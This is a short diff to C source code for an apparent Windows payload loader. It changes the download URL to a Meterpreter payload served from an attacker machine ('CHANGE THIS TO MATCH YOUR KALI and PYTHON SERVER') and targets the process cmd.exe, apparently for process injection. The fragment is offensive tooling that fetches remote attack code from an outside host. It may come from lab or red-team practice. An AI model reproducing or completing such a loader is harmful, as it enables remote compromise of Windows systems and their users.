@@ -5,7 +5,7 @@
 
 #pragma comment (lib, "Wininet.lib")
 
-#define PAYLOAD	L"http://192.168.216.130:8080/tests" // CHANGE THIS TO MATCH YOUR KALI and PYTHON SERVER
+#define PAYLOAD	L"http://192.168.200.130:8000/Meterpreter_Payload" // CHANGE THIS TO MATCH YOUR KALI and PYTHON SERVER
 #define TARGET_PROCESS		"cmd.exe"
 
 
